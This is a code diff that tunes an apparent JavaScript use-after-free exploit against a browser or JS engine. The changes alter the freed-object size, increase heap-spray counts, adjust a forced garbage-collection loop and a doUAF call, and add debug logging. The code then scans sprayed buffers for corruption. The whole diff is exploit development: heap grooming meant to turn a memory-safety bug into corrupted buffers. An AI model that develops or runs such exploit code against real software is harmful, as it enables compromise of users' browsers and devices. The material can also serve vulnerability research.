@@ -18,13 +18,14 @@ const maxOffset = Math.max(
 
 //const UAF_SIZE = off.size_strimpl + off.js_inline_prop;
 //const SPRAY_COUNT = 0x400;
-const UAF_SIZE = maxOffset + 0x30;
-
+//const UAF_SIZE = maxOffset + 0x30;
+const UAF_SIZE = 0x40; 
 const SPRAY_COUNT = 0x800;
 
 function gc() {
    // new Uint8Array(4 * MB);
-   for (let i = 0; i < 5; i++) new Uint8Array(8 * MB);
+ //  for (let i = 0; i < 5; i++) new Uint8Array(8 * MB);
+for (let i = 0; i < 3; i++) new Uint8Array(8 * MB);
 
 }
 
@@ -42,6 +43,8 @@ function spray(count, size) {
     const v = new Uint8Array(size);
     v[0] = 0x41;
     arr.push(v);
+   log(`[spray] spray ${i}`);
+
   }
   return arr;
 }
@@ -123,18 +126,24 @@ addEventListener('unhandledrejection', event => {
  
 
  
-  const pre = spray(SPRAY_COUNT, UAF_SIZE);
-  const leaked = await doUAF(1600);
+//  const pre = spray(SPRAY_COUNT, UAF_SIZE);
+ const pre = spray(SPRAY_COUNT * 2, UAF_SIZE);
+
+  const leaked = await doUAF(3000);
  for (let round = 0; round < 3; round++) {
   log(`[+] GC round ${round}`);
+  log(`[doUAF] prima del GC`);
+
   gc();
   await sleep(1);
    log(`[+] Spray round ${round}`);
   spray(SPRAY_COUNT, UAF_SIZE);
 }
+ const buffers = spray(SPRAY_COUNT * 4, UAF_SIZE);
+
 //const buffers = spray(SPRAY_COUNT, UAF_SIZE);
  // gc(); await sleep();
-  const buffers = spray(SPRAY_COUNT, UAF_SIZE);
+//  const buffers = spray(SPRAY_COUNT, UAF_SIZE);
   const bad = findAllCorrupted(buffers);
   if (!bad.length) {
     die("No corrupted buffer");
